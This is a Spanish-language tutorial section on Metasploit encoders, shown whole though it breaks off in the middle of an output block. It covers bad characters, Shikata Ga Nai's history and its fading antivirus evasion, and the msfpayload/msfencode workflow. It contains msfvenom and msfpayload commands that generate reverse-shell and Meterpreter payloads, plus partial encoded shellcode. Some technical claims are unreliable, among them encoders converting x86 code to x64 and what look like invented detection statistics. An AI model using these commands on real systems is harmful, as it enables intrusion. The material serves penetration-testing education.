# Sección 6: Encoders en Metasploit

## 📋 Tabla de Contenidos

1. [¿Qué son los Encoders?](#qué-son-los-encoders)
2. [Arquitecturas Soportadas](#arquitecturas-soportadas)
3. [Funciones de los Encoders](#funciones-de-los-encoders)
4. [Shikata Ga Nai (SGN)](#shikata-ga-nai-sgn)
5. [Herramientas Legacy: msfpayload y msfencode](#herramientas-legacy-msfpayload-y-msfencode)
6. [msfvenom: La Herramienta Moderna](#msfvenom-la-herramienta-moderna)
7. [Seleccionar Encoders en msfconsole](#seleccionar-encoders-en-msfconsole)
8. [Pruebas Reales: Evasión de Antivirus](#pruebas-reales-evasión-de-antivirus)
9. [VirusTotal Integration](#virustotal-integration)
10. [Limitaciones de los Encoders](#limitaciones-de-los-encoders)

---

## 🎯 ¿Qué son los Encoders?

### Definición Técnica

> A lo largo de los **15 años de existencia** del Metasploit Framework, los Encoders han asistido con hacer que los payloads sean compatibles con diferentes arquitecturas de procesador mientras que al mismo tiempo ayudaban con la evasión de antivirus.

Pero esa definición técnica no te dice **realmente** qué es un encoder. Vamos a desglosarlo paso a paso.

### Analogía: La Carta Internacional

Imagina que escribes una carta en español para enviársela a alguien en Japón:

```
┌─────────────────────────────────────────┐
│         PROBLEMA ORIGINAL               │
└─────────────────────────────────────────┘

TÚ (España):
  "Hola, ¿cómo estás? Me gustaría..."
  
DESTINATARIO (Japón):
  "こんにちは、元気ですか？私は..."
  (No entiende español)

CONTROL DE SEGURIDAD (Correos):
  "Esta carta contiene la palabra 'bomba'"
  → RECHAZADA (aunque fuera "bomba de agua")
```

**Necesitas DOS cosas**:

1. **TRADUCIR** el mensaje (español → japonés)
2. **REFORMULAR** palabras prohibidas ("bomba de agua" → "dispositivo hidráulico")

**Eso es exactamente lo que hace un encoder con los payloads**:

```
┌─────────────────────────────────────────┐
│         SOLUCIÓN CON ENCODER            │
└─────────────────────────────────────────┘

PAYLOAD ORIGINAL (x86):
  Código: 4D 5A 90 00 03 00 FF FF
  
PROBLEMAS:
  1. Solo funciona en x86 (necesita funcionar en x64)
  2. Tiene bytes "malos": 00 FF (antivirus los detecta)
  
ENCODER hace:
  1. ADAPTA el código para x64
  2. REESCRIBE para evitar bytes 00 y FF
  
RESULTADO:
  Código: A1 B2 C3 D4 E5 F6 A7 B8
  ✅ Funciona en x64
  ✅ No tiene bytes prohibidos
```

### Las Dos Funciones Principales

Los Encoders tienen **DOS trabajos** completamente diferentes:

#### Función 1: Compatibilidad de Arquitectura

**El Problema**:

Un payload compilado para un procesador Intel de 32 bits (x86) **NO funcionará** en un procesador de 64 bits (x64), un procesador ARM (teléfonos), o un procesador MIPS (routers).

```
PAYLOAD para x86:
  Instrucción: MOV EAX, EBX
  Código: 89 D8
  
  ✅ Funciona en: CPU x86
  ❌ NO funciona en: CPU x64, ARM, MIPS, SPARC, PowerPC
```

**La Solución del Encoder**:

```
ENCODER adapta:
  
  Entrada: Payload x86 (89 D8)
  Proceso: Traduce a instrucciones equivalentes para x64
  Salida: Payload x64 (48 89 C3)
  
  ✅ Ahora funciona en CPU x64
```

**Analogía Técnica**:

Es como tener un **enchufe europeo** (220V, tipo C) pero necesitas usarlo en **Estados Unidos** (110V, tipo A).

```
SIN ADAPTADOR:
  Enchufe EU ──X──> Toma US
  (No encaja, no funciona)

CON ADAPTADOR (ENCODER):
  Enchufe EU ──>[ADAPTADOR]──> Toma US
  (Ahora sí funciona)
```

El encoder es ese **adaptador** que hace que el payload funcione en diferentes "tomas" (arquitecturas).

#### Función 2: Eliminación de Bad Characters

**¿Qué son los Bad Characters?** (Explicación Profunda)

Imagina que envías un mensaje por telegrama, pero el operador tiene órdenes de:
- Cortar la transmisión si encuentra la palabra "STOP"
- Ignorar todo después de un punto final  
- Reiniciar si ve un salto de línea

**Esos son tus "bad characters"** - caracteres que rompen la comunicación.

En programación, ciertos bytes tienen **significados especiales** que causan que el payload se rompa:

**Los Bad Characters Más Comunes**:

| Byte | Hex | Nombre | Problema que Causa | Ejemplo Real |
|------|-----|--------|-------------------|--------------|
| NULL | `\x00` | Null byte | **Termina cadenas en C/C++**. Si tu payload tiene `\x00`, todo lo que viene después es ignorado | `strcpy()` para de copiar al encontrar `\x00` |
| LF | `\x0a` | Line feed | **Salto de línea**. Algunos protocolos lo interpretan como "fin de comando" | HTTP puede interpretar `\x0a\x0a` como fin de headers |
| CR | `\x0d` | Carriage return | **Retorno de carro**. Puede romper transmisión en protocolos de texto | FTP usa `\x0d\x0a` como delimitador |
| SPACE | `\x20` | Espacio | Algunos parsers lo usan como **delimitador** entre comandos | URL encoding rompe con espacios sin encoded |

**Ejemplo Real del Problema del Null Byte**:

Supongamos que tienes este payload (simplificado):

```c
// Tu payload en memoria
char payload[] = "EXPLOIT_CODE\x00MORE_EXPLOIT_CODE";

// Programa vulnerable usa strcpy
strcpy(buffer, payload);

// ¿Qué se copia realmente?
printf("Buffer: %s", buffer);

// Output: "EXPLOIT_CODE"
//         └─ Se cortó aquí porque strcpy() para en \x00
//            Perdiste "MORE_EXPLOIT_CODE"
```

**Otro Ejemplo: Buffer Overflow con Null Bytes**:

```
OBJETIVO: Sobrescribir return address con 0x41414100

MEMORIA ANTES:
[AAAA][AAAA][AAAA][RET=0x12345678]

INTENTAS ESCRIBIR:
payload = "A" * 12 + "\x00\x41\x41\x41"

MEMORIA DESPUÉS:
[AAAA][AAAA][AAAA][RET=0x12345678]
                    └─ No cambió! strcpy() paró en el \x00
```

**¿Cómo lo Soluciona el Encoder?**

El encoder **reescribe el payload** para decir lo mismo sin usar el byte prohibido:

```
TÉCNICA: Reemplazar instrucciones problemáticas

ANTES (con \x00):
  MOV EAX, 0x00000001
  Bytes: B8 01 00 00 00
         └──┴──┴──┴─ Cuatro \x00 aquí
  
DESPUÉS (sin \x00):
  XOR EAX, EAX        ; EAX = 0
  INC EAX             ; EAX = 1
  Bytes: 31 C0 40
         └─ ¡Ningún \x00!
  
RESULTADO: EAX = 1 (igual que antes)
BENEFICIO: Sin bad characters
```

**Analogía Perfecta**:

Es como jugar "Tabú" - ese juego donde tienes que describir algo **sin usar ciertas palabras prohibidas**:

```
OBJETIVO: Describir "elefante"
PALABRAS PROHIBIDAS: "trompa", "grande", "gris"

DESCRIPCIÓN NORMAL:
  "Un animal grande y gris con trompa"
  └─ ❌ Usaste palabras prohibidas

DESCRIPCIÓN SIN PALABRAS PROHIBIDAS:
  "Un mamífero de cuatro patas, de tamaño enorme, 
   color similar al asfalto, con una nariz alargada flexible"
  └─ ✅ Describes lo mismo sin palabras prohibidas
```

El encoder hace lo mismo: describe el **mismo comportamiento** usando **diferentes "palabras" (bytes)**.

### Función 3: Evasión de Antivirus (AV)

**Objetivo Original**: Ofuscar el payload para que no sea detectado por firmas de AV.

Pero aquí viene la parte triste de la historia...

#### Cómo Funcionaban los Antivirus (Método Antiguo - Pre-2010)

**Detección por Firmas Estáticas**:

```
BASE DE DATOS DEL ANTIVIRUS:
┌───────────────────────────────────┐
│ Firma #12345: Meterpreter         │
│ Pattern: 4D 5A 90 00 03 00 FC 00  │
│ Action: BLOCK                     │
└───────────────────────────────────┘

TU ARCHIVO: 
  Bytes: 4D 5A 90 00 03 00 FC 00 ...
         └──────┴──────┴──────┴─── ¡Coincide!
         
RESULTADO: ❌ BLOQUEADO
```

**Analogía**: Es como un guardia de seguridad que tiene **fotos de criminales**. Si tu cara coincide con alguna foto → No pasas.

**¿Cómo Evadirlo con Encoders?** (Funcionaba en 2005-2012)

Los encoders **cambiaban el aspecto** del payload:

```
PAYLOAD ORIGINAL:
  4D 5A 90 00 03 00 FC 00
  └─ Firma conocida por el AV

APLICAR ENCODER:
  ↓ [Shikata Ga Nai]
  
PAYLOAD ENCODIFICADO:
  B2 E7 3A 55 AD 55 7F 21
  └─ Ya no coincide con la firma
  
ANTIVIRUS:
  "No reconozco este patrón" → ✅ PERMITIDO
```

**Analogía**: Es como usar un **disfraz**. Cambias tu apariencia, pero sigues siendo la misma persona.

#### Cómo Funcionan los Antivirus MODERNOS (2015+)

Aquí es donde la historia se pone triste para los atacantes...

**Método 1: Análisis Heurístico** (Análisis de Comportamiento)

```
ANTIVIRUS MODERNO:
┌────────────────────────────────────────┐
│ "No me importa CÓMO se vea el archivo │
│  Me importa QUÉ HACE cuando se ejecuta"│
└────────────────────────────────────────┘

EJECUTA EL PAYLOAD EN SANDBOX:
  1. Abre socket → 🚨 SOSPECHOSO
  2. Lee memoria del proceso lsass.exe → 🚨🚨 MUY SOSPECHOSO  
  3. Conecta a IP externa → 🚨🚨🚨 CRÍTICO
  4. Inyecta código en otro proceso → ❌ BLOQUEADO
  
Score de Malware: 95/100
Acción: BLOCK
```

**Resultado**: Aunque el payload **se vea diferente** (encodificado), su **comportamiento** lo delata.

**Analogía Extendida**:

Imagina un banco con dos tipos de seguridad:

```
SEGURIDAD ANTIGUA (Firmas):
  Guardia: "Tengo fotos de ladrones conocidos"
  Ladrón con disfraz: *pasa* ✅
  
SEGURIDAD MODERNA (Heurística):
  Guardia: "No me importa tu cara, pero veo que:"
    - Llevas una bolsa grande vacía (sospechoso)
    - Miras nerviosamente las cámaras (sospechoso)
    - Te acercas a la bóveda (muy sospechoso)
    - Sacas una pistola (BLOQUEADO)
  Ladrón: *No pasa aunque tenga disfraz* ❌
```

**Método 2: Detección de Encoders Conocidos**

Aquí está el **golpe mortal** para Shikata Ga Nai y otros encoders de Metasploit:

```
ANTIVIRUS APRENDE LOS ENCODERS:

"Este archivo tiene la ESTRUCTURA de Shikata Ga Nai:
  - Loop FPU característico
  - Patrón de XOR con feedback
  - Stub decoder reconocible
  
Conclusión: Probablemente es Metasploit
Acción: EJECUTAR EN SANDBOX y analizar"
```

**El Problema del Decoder Stub**:

Todo payload encodificado necesita un **decoder** (descodificador) al principio:

```
┌──────────────────────────────┐
│        DECODER STUB          │ ← Código visible que descifra el payload
│  (siempre tiene patrones     │   Este código SÍ es reconocible
│   similares y detectables)   │
├──────────────────────────────┤
│     PAYLOAD ENCODIFICADO     │ ← Payload cifrado (parece random)
│   (este sí se ve diferente)  │
└──────────────────────────────┘
```

**Analogía**: Es como tener una **carta cifrada perfecta**, pero el sobre siempre dice:

```
┌─────────────────────────────┐
│ ⚠️  MENSAJE SECRETO         │
│ USAR CÓDIGO CÉSAR PARA      │
│ DESCIFRAR                   │
│                             │
│ [Mensaje cifrado dentro]    │
└─────────────────────────────┘
```

El sobre te delata **aunque la carta esté perfectamente cifrada**.

Los antivirus modernos piensan:

> "Veo un decoder stub de Shikata Ga Nai → Probablemente hay un payload de Metasploit adentro → Voy a ejecutarlo en sandbox y ver qué hace → Ah sí, es Meterpreter → BLOQUEADO"

**Método 3: Machine Learning** (Estado del Arte - 2020+)

```
ANTIVIRUS ENTRENADO CON MILLONES DE MUESTRAS:

┌────────────────────────────────────────┐
│ Modelo de ML analiza:                  │
│ - Estructura del archivo               │
│ - Patrones de bytes                    │
│ - Entropía (qué tan "random" se ve)    │
│ - Secciones del PE                     │
│ - Imports/Exports                      │
│ - Strings embebidas                    │
│                                        │
│ Resultado: 96% probabilidad de malware │
│ Acción: BLOCK                          │
└────────────────────────────────────────┘
```

**Analogía**: Es como un **detective experimentado** que ha visto 10,000 casos.

Aunque cada criminal use un disfraz diferente, el detective reconoce **patrones de comportamiento** comunes a todos:

```
Detective: "He visto este patrón antes:
  - Nerviosismo similar (alta entropía)
  - Misma forma de mirar (estructura de archivo)
  - Movimientos similares (flujo del código)
  
  Aunque cada uno se vea diferente,
  todos los ladrones actúan parecido.
  
  Este individuo: 96% seguro que es ladrón"
```

### La Realidad Actual (2025)

> El uso de encoders **estrictamente para evasión de AV** ha disminuido con el tiempo, ya que los fabricantes de IPS/IDS han mejorado cómo su software maneja firmas en malware y viruses.

**Traducción**: Los encoders estándar de Metasploit **YA NO FUNCIONAN** para evadir antivirus modernos.

**¿Por qué?**

1. ✅ Los AV reconocen los encoders mismos (especialmente Shikata Ga Nai)
2. ✅ Analizan comportamiento, no solo apariencia
3. ✅ Usan Machine Learning entrenado con millones de muestras
4. ✅ Ejecutan payloads en sandboxes virtuales
5. ✅ Detectan entropía alta (código que parece muy random)

**Entonces, ¿Para Qué Sirven los Encoders Hoy?**

| Uso | ¿Funciona? | Explicación |
|-----|------------|-------------|
| **Eliminar bad characters** | ✅ SÍ | Esto sigue siendo útil al 100% |
| **Compatibilidad de arquitectura** | ✅ SÍ | Adaptar x86 → x64, etc. |
| **Evasión de AV moderno** | ❌ NO | Los AV ya conocen estos encoders |
| **Base para encoders personalizados** | ✅ SÍ | Puedes modificarlos para crear los tuyos |

---

## 🖥️ Arquitecturas Soportadas

Los Encoders modifican el payload para ejecutarse en diferentes sistemas operativos y arquitecturas de procesador.

### Las Cinco Arquitecturas Principales

| Arquitectura | Descripción | Usado en | Bits |
|--------------|-------------|----------|------|
| **x64** | Arquitectura Intel/AMD de 64 bits | PCs modernas, servidores | 64 |
| **x86** | Arquitectura Intel/AMD de 32 bits | PCs viejas, sistemas legacy | 32 |
| **SPARC** | Scalable Processor Architecture | Servidores Oracle/Sun | 32/64 |
| **PPC** | PowerPC | Servidores IBM, Macs antiguos | 32/64 |
| **MIPS** | Microprocessor without Interlocked Pipelined Stages | Routers, dispositivos embebidos | 32/64 |

### ¿Por Qué Importan las Arquitecturas?

**Cada arquitectura tiene**:
- Conjunto de instrucciones diferente
- Registros diferentes
- Convenciones de llamada diferentes
- Tamaño de punteros diferente

**Ejemplo Simple**:

```
QUIERES: Cargar el valor 1 en un registro

x86 (32 bits):
  Instrucción: MOV EAX, 1
  Bytes: B8 01 00 00 00
  Registros: EAX, EBX, ECX, EDX (32 bits cada uno)

x64 (64 bits):
  Instrucción: MOV RAX, 1
  Bytes: 48 C7 C0 01 00 00 00
  Registros: RAX, RBX, RCX, RDX (64 bits cada uno)

ARM (32 bits):
  Instrucción: MOV R0, #1
  Bytes: 01 00 A0 E3
  Registros: R0-R15 (32 bits cada uno)
```

**¿Ves? El mismo objetivo ("cargar 1 en un registro") requiere CÓDIGO COMPLETAMENTE DIFERENTE.**

Por eso necesitas un encoder que **adapte** tu payload a la arquitectura correcta.

---

## 🎭 Shikata Ga Nai (SGN)

### Origen del Nombre - La Historia Completa

**Shikata Ga Nai** (仕方がない) es una expresión japonesa que se pronuncia "shi-ka-ta ga na-i".

**Significado Literal**:
- 仕方 (shikata) = forma / manera / método
- が (ga) = partícula gramatical
- ない (nai) = no existe / no hay

**Significado Contextual**:
- "No se puede evitar"
- "No hay nada que hacer al respecto"
- "Es lo que hay"
- "Así es la vida"

**Uso Cultural en Japón**:

Es una expresión muy común que refleja:
- Aceptación estoica de la realidad
- "Es lo que es, no podemos cambiarlo"
- Actitud pragmática ante situaciones inevitables

**Ejemplos cotidianos**:
```
Situación: El tren se retrasó 2 horas
Respuesta: "Shikata ga nai" (Qué se le va a hacer)

Situación: Perdí mi billetera
Respuesta: "Shikata ga nai" (Ya no se puede hacer nada)

Situación: Llovió el día de mi boda
Respuesta: "Shikata ga nai" (Así es la vida)
```

### ¿Por Qué Este Nombre Para un Encoder?

El autor del encoder (probablemente un hacker con sentido del humor) eligió este nombre porque:

**Cuando salió SGN (circa 2004)**:

```
ANALISTA DE SEGURIDAD encuentra malware:
  "Este archivo está encodificado con Shikata Ga Nai..."
  *intenta analizarlo*
  *no puede detectarlo*
  *suspira*
  "Shikata ga nai... no hay nada que podamos hacer"
  
AUTOR DEL ENCODER:
  *risa malvada* 
  "Exactamente por eso lo llamé así"
```

**Era literalmente un** ***trolleo de nivel experto***.

El nombre decía: "Buena suerte tratando de detectar esto, porque shikata ga nai - no hay nada que puedan hacer al respecto".

### La Ironía Moderna (2025)

Hoy en día, el nombre sigue siendo apropiado, pero **al revés** - para los **atacantes**:

```
ATACANTE en 2025:
  "Voy a encodificar mi payload con Shikata Ga Nai"
  *genera payload*
  *sube a VirusTotal*
  *54 de 69 antivirus lo detectan*
  *suspira*
  "Shikata ga nai... ya no hay nada que pueda hacer,
   los AV me detectan igual"
```

**El cazador se convirtió en la presa.** 😄

### Historia y Evolución de Shikata Ga Nai

#### La Era Dorada (2004-2012): "El Rey Invencible"

**Por qué Shikata Ga Nai fue TAN efectivo**:

**1. Polimórfico** (Cada ejecución genera código diferente)

```
GENERACIÓN 1:
  Payload: A1 B2 C3 D4 E5 F6 G7 H8 I9 J0

GENERACIÓN 2:  
  Payload: K1 L2 M3 N4 O5 P6 Q7 R8 S9 T0

GENERACIÓN 3:
  Payload: U1 V2 W3 X4 Y5 Z6 A7 B8 C9 D0

Mismo payload, código completamente diferente cada vez
```

**Analogía**: Es como si cada vez que envías una carta, la escribes en un **idioma diferente**:
- Primera vez: Español
- Segunda vez: Francés  
- Tercera vez: Alemán
- Pero el **mensaje** siempre dice lo mismo

**¿Cómo puede el antivirus crear una firma** si el código **nunca es igual**?

**Respuesta de 2004**: No puede. Por eso SGN era tan efectivo.

**2. Usa Instrucciones Legítimas del Procesador**

```
SGN NO hace:
  Código sospechoso: 0xDEADBEEF (firma obvia)

SGN SÍ hace:
  Código legítimo:
    ADD EAX, EBX
    XOR ECX, EDX  
    MOV ESI, EDI
    
  └─ Instrucciones normales usadas por software legítimo
```

**No había "huellas dactilares" obvias** que detectar.

**3. XOR con Feedback Aditivo** (La Magia Técnica)

Aquí está el algoritmo simplificado:

```python
# Pseudocódigo de Shikata Ga Nai

payload = [0x41, 0x42, 0x43, 0x44]  # "ABCD"
key = 0xFF  # Clave inicial

encoded = []

for byte in payload:
    # XOR el byte con la clave
    encrypted = byte XOR key
    encoded.append(encrypted)
    
    # La clave cambia basándose en el resultado
    key = (key + encrypted) & 0xFF  # Feedback aditivo
    
# Cada byte es encodificado con una clave DIFERENTE
# La clave depende del byte anterior
# No hay patrón predecible
```

**Visualización**:

```
Byte 1: 'A' (0x41)
  └─ XOR con clave 0xFF = 0xBE
  └─ Nueva clave: 0xFF + 0xBE = 0xBD (con overflow)

Byte 2: 'B' (0x42)
  └─ XOR con clave 0xBD = 0xFF  
  └─ Nueva clave: 0xBD + 0xFF = 0xBC

Byte 3: 'C' (0x43)
  └─ XOR con clave 0xBC = 0xFF
  └─ Nueva clave: 0xBC + 0xFF = 0xBB

... y así sucesivamente
```

**Lo Inteligente**: 
- La clave **cambia constantemente**
- El cambio depende de **los datos mismos**
- No hay patrón fijo
- Cada ejecución usa claves diferentes

**Analogía de la Cerradura Mágica**:

```
CERRADURA NORMAL:
  Combinación: 1-2-3-4
  └─ Siempre la misma

CERRADURA SHIKATA GA NAI:
  Lunes 10:00 AM: Combinación 5-8-2-9
  Lunes 10:01 AM: Combinación 3-1-7-4  
  Lunes 10:02 AM: Combinación 9-4-6-2
  
  └─ Cambia cada segundo basándose en la hora exacta
```

¿Cómo memorizar la combinación si **cambia todo el tiempo**? No puedes. Por eso era tan difícil de detectar.

#### La Caída (2013-2020): "El Rey Derrocado"

**¿Qué pasó?**

Los investigadores de seguridad (especialmente **FireEye** en 2019) hicieron un análisis profundo y descubrieron:

**Descubrimiento 1: Patrones Estructurales del Decoder**

Aunque el **payload** encodificado es diferente cada vez, el **decoder** (el código que lo descifra) tiene **patrones reconocibles**:

```
ESTRUCTURA TÍPICA DE UN DECODER SGN:

┌────────────────────────────────────┐
│ 1. FPU Stack Manipulation         │ ← Patrón reconocible
│    (para obtener ubicación actual) │
├────────────────────────────────────┤
│ 2. Loop de decodificación XOR      │ ← Estructura similar siempre
├────────────────────────────────────┤
│ 3. Salto al payload decodificado   │ ← Patrón de salto característico
└────────────────────────────────────┘
```

**El Problema**: Aunque cada decoder es **un poco diferente**, todos tienen la **misma estructura base**.

**Analogía**: Es como diferentes personas escribiendo una carta:

```
CARTA 1:
  "Estimado Sr. García,
   Me dirijo a usted para..."

CARTA 2:
  "Querida Sra. Rodríguez,
   Le escribo para..."

CARTA 3:
  "Apreciado Dr. López,
   Me pongo en contacto para..."
   
PATRÓN COMÚN:
  [Saludo formal], [Nombre],
  [Frase de apertura] [propósito]...
```

Aunque las palabras cambien, la **estructura** es reconocible. Los antivirus aprendieron a detectar esa estructura.

**Descubrimiento 2: Firma del Decoder Stub**

El payload encodificado necesita un **stub** (código pequeño) que lo descifre:

```
┌──────────────────────────────────┐
│       DECODER STUB               │ ← Siempre visible, detectable
│  (Código que descifra el payload)│   Tiene patrones característicos:
│                                  │   - FPU loops
│  Características detectables:    │   - XOR patterns  
│  - Loop FPU específico           │   - Jump sequences
│  - Patrón de XOR con feedback    │
│  - Secuencia de saltos           │
├──────────────────────────────────┤
│     PAYLOAD ENCODIFICADO         │ ← Parece random (bien ocultado)
│   (Cifrado con XOR variable)     │
└──────────────────────────────────┘
```

**La Trampa**: Aunque el payload está perfectamente ofuscado, el **decoder stub** te delata.

**Analogía Perfecta del Sobre Delator**:

```
┌─────────────────────────────────────┐
│  ⚠️  MENSAJE ULTRA SECRETO         │
│                                     │
│  INSTRUCCIONES DE DESCIFRADO:       │
│  1. Aplicar algoritmo XOR           │
│  2. Con clave variable basada en... │
│  3. Feedback aditivo usando...      │
│                                     │
│  [Mensaje perfectamente cifrado]   │
└─────────────────────────────────────┘
```

El **sobre** (decoder stub) dice exactamente cómo descifrar el mensaje. Aunque el mensaje esté cifrado, **el sobre te delata**.

Los antivirus modernos piensan:

> "Veo un decoder stub con la estructura de Shikata Ga Nai → Probablemente hay un payload de Metasploit adentro → Voy a ejecutarlo en sandbox para confirmar → Sí, es Meterpreter → BLOQUEADO"

**Descubrimiento 3: Análisis Heurístico Derrota el Polimorfismo**

```
ANTIVIRUS MODERNO ejecuta en sandbox:

1. Detecta decoder stub de SGN
   └─> "Interesante, veamos qué hace"

2. Deja que el decoder se ejecute
   └─> Payload se auto-descifra en memoria

3. Analiza el payload YA DESCIFRADO
   └─> "Ah, es Meterpreter"

4. BLOQUEA
```

**El Polimorfismo no importa** si el antivirus simplemente **espera a que el payload se descifre solo**.

**Analogía del Disfraz**:

```
LADRÓN con disfraz perfecto:
  Entra al banco disfrazado de policía
  └─> Seguridad: "Ok, pase oficial"
  
  Llega a la bóveda
  └─> Se quita el disfraz
  └─> Saca el arma
  
  Seguridad (viendo en cámaras):
  └─> "¡Ah! Ahora veo que es un ladrón"
  └─> ALARMA
```

No importa qué tan buen disfraz tengas si eventualmente **tienes que revelarte** para hacer tu trabajo.

### Estadísticas Reales de Detección

| Año | SGN (1 iteración) | SGN (10 iteraciones) | Comentario |
|-----|-------------------|----------------------|------------|
| **2005** | ~3% (1/30 AV) | ~1% (0/30 AV) | Era dorada - casi indetectable |
| **2010** | ~5% (2/40 AV) | ~2% (1/40 AV) | Aún muy efectivo |
| **2015** | ~35% (18/50 AV) | ~25% (13/50 AV) | Empiezan a detectarlo |
| **2020** | ~70% (45/65 AV) | ~65% (42/65 AV) | Mayoría lo detecta |
| **2025** | ~**80%** (54/69 AV) | ~**76%** (52/68 AV) | Casi inútil para evasión |

**Gráfica de Tendencia**:

```
TASA DE DETECCIÓN DE SHIKATA GA NAI

100% │                                     ●(2025)
     │                                   ●
     │                              ●
 75% │                         ●
     │                    ●
 50% │              ●
     │         ●
 25% │    ●
     │●
  0% └───┬───┬───┬───┬───┬───┬───┬───┬───┬───
      2005  2010  2015  2020  2025

● = Tasa de detección promedio
Tendencia: Incremento exponencial
```

**Conclusión Brutal**: Shikata Ga Nai pasó de ser **"el rey invencible"** (2005) a **"casi inútil"** (2025) en 20 años.

### ¿Por Qué Shikata Ga Nai Sigue Existiendo?

**Pregunta válida**: Si ya no funciona para evasión de AV, ¿para qué se mantiene en Metasploit?

**Razones Legítimas**:

#### 1. Eliminar Bad Characters ✅

```bash
# Esto SÍ sigue siendo útil al 100%
msfvenom -p windows/shell_reverse_tcp \
  LHOST=10.10.10.5 LPORT=4444 \
  -b "\x00\x0a\x0d" \  # ← Evitar bytes problemáticos
  -e x86/shikata_ga_nai \
  -f c
```

Shikata Ga Nai es **excelente** para reescribir payloads sin usar bad characters específicos.

#### 2. Compatibilidad de Arquitectura ✅

Puede adaptar payloads entre:
- x86 ↔ x64
- Diferentes calling conventions
- Diferentes formatos de ejecutables

#### 3. Legado y Compatibilidad con Scripts Viejos ✅

Muchos scripts, tutoriales y herramientas de hace años **dependen** de Shikata Ga Nai.

Ejemplo:
```bash
# Script de 2015 que todavía se usa
#!/bin/bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT \
  -e x86/shikata_ga_nai \  # ← Esto debe seguir funcionando
  -f exe > payload.exe
```

Si Metasploit **removiera** SGN, **rompería** miles de scripts existentes.

#### 4. Base para Custom Encoders ✅

Puedes **estudiar** y **modificar** Shikata Ga Nai para crear tu propio encoder personalizado:

```ruby
# Archivo: /usr/share/metasploit-framework/modules/encoders/x86/shikata_ga_nai.rb

# Puedes copiarlo y modificar:
# - Cambiar el algoritmo XOR
# - Modificar el decoder stub
# - Ajustar el polimorfismo
# - Crear tu propia variante

class MetasploitModule < Msf::Encoder::Xor
  def encode_block(state, block)
    # Tu código personalizado aquí
  end
end
```

**Esto es extremadamente valioso** para:
- Aprender cómo funcionan los encoders
- Desarrollar tus propias técnicas
- Research de seguridad
- Red teaming avanzado

#### 5. Educación y Training ✅

Shikata Ga Nai es **perfecto para enseñar**:
- Cómo funcionan los encoders
- Técnicas de polimorfismo
- Análisis de malware
- Desarrollo de exploits

Es como estudiar **historia militar**: Aunque las tácticas de la Segunda Guerra Mundial ya no se usan, estudiarlas te enseña **principios fundamentales** de estrategia.

### Referencia Técnica: Artículo de FireEye

**Artículo Fundamental** (2019): 
- [Shikata Ga Nai Encoder Still Going Strong](https://www.fireeye.com/blog/threat-research/2019/10/shikata-ga-nai-encoder-still-going-strong.html)

Este artículo de FireEye detalla:

1. **Cómo funciona el algoritmo internamente**
   - Pseudocódigo completo
   - Diagramas de flujo
   - Explicación del XOR con feedback

2. **Por qué fue tan efectivo históricamente**
   - Análisis de su diseño polimórfico
   - Comparación con otros encoders
   - Estadísticas de detección 2004-2015

3. **Cómo los AV modernos lo detectan**
   - Firmas del decoder stub
   - Análisis heurístico
   - Técnicas de machine learning

4. **Variantes y evoluciones**
   - Modificaciones comunes
   - Intentos de mejorarlo
   - Encoders inspirados en SGN

**Lectura Recomendada**: Si te interesa:
- Análisis de malware
- Desarrollo de exploits
- Técnicas de evasión
- Research de seguridad

Este artículo es **oro puro**. Es como el "libro sagrado" de encoders polimórficos.

### Curiosidad Cultural: "Shikata Ga Nai" en la Historia

La expresión tiene un contexto histórico profundo:

**Post-Segunda Guerra Mundial**:

Después de que Japón perdió la guerra, muchos japoneses usaban "shikata ga nai" para aceptar:
- La ocupación americana
- La pérdida de territorio
- Las condiciones de rendición

**Significaba**: "Ya pasó, no podemos cambiarlo, hay que seguir adelante"

**En la Cultura Pop**:

Aparece en:
- Anime y manga (expresión común)
- Literatura japonesa
- Películas de Kurosawa
- Novelas como "A Pale View of Hills" de Kazuo Ishiguro

**En el Contexto del Encoder**:

El autor eligió un nombre que:
1. Refleja la filosofía japonesa de aceptación estoica
2. Trollea a los analistas de seguridad
3. Se convirtió en profecía auto-cumplida (ahora los **atacantes** dicen "shikata ga nai" porque no pueden evitar ser detectados)

**Triple Ironía**:
- **2005**: Analistas dicen "shikata ga nai" (no podemos detectarlo)
- **2025**: Atacantes dicen "shikata ga nai" (no puedo evitar ser detectado)
- **Siempre**: El nombre fue perfecto para ambos lados

---

## 🛠️ Herramientas Legacy: msfpayload y msfencode

### El Sistema Antiguo (Pre-2015)

Antes de 2015, Metasploit usaba **dos herramientas separadas**:

| Herramienta | Función | Ubicación |
|-------------|---------|-----------|
| **msfpayload** | Generación de payloads | `/usr/share/framework2/msfpayload` |
| **msfencode** | Encoding de payloads | `/usr/share/framework2/msfencode` |

**¿Por qué estaban separadas?**

Era la filosofía Unix: "Haz una cosa y hazla bien"

```
FILOSOFÍA UNIX:
  - Cada programa hace UNA cosa
  - Los programas se combinan con pipes
  - Flexibilidad máxima
```

### Workflow Antiguo Explicado

#### Paso 1: Generar Payload con msfpayload

```bash
$ msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R
```

**Desglose del comando**:
- `msfpayload` = El programa generador
- `windows/shell_reverse_tcp` = Tipo de payload
- `LHOST=127.0.0.1` = Tu IP (atacante)
- `LPORT=4444` = Tu puerto (atacante)
- `R` = Output RAW (bytes crudos)

**Output** (simplificado):
```
\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50
\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26
...
```

Este es el payload **sin encodificar** - bytes crudos que:
- Tiene null bytes (`\x00`)
- No está ofuscado
- AV lo detecta instantáneamente

#### Paso 2: Encodificar con msfencode (via Pipe)

```bash
$ msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | \
  msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
```

**¿Qué hace el pipe `|`?**

```
┌──────────────┐       PIPE      ┌──────────────┐
│  msfpayload  │ ────────────> │  msfencode   │
│              │   Output RAW    │              │
│ Genera bytes │   como input    │ Encodifica   │
└──────────────┘                 └──────────────┘
```

**Desglose de msfencode**:
- `-b '\x00'` = Bad characters a evitar (null bytes)
- `-f perl` = Formato de salida (Perl script)
- `-e x86/shikata_ga_nai` = Encoder a usar

**Output Final**:

```perl
[*] x86/shikata_ga_nai succeeded with size 1636 (iteration=1)

my $buf = 
"\xbe\x7b\xe6\xcd\x7c\xd9\xf6\xd9\x74\x24\xf4\x58\x2b\xc9" .
"\x66\xb9\x92\x01\x31\x70\x17\x83\xc0\x04\x03\x70\x13\xe2" .
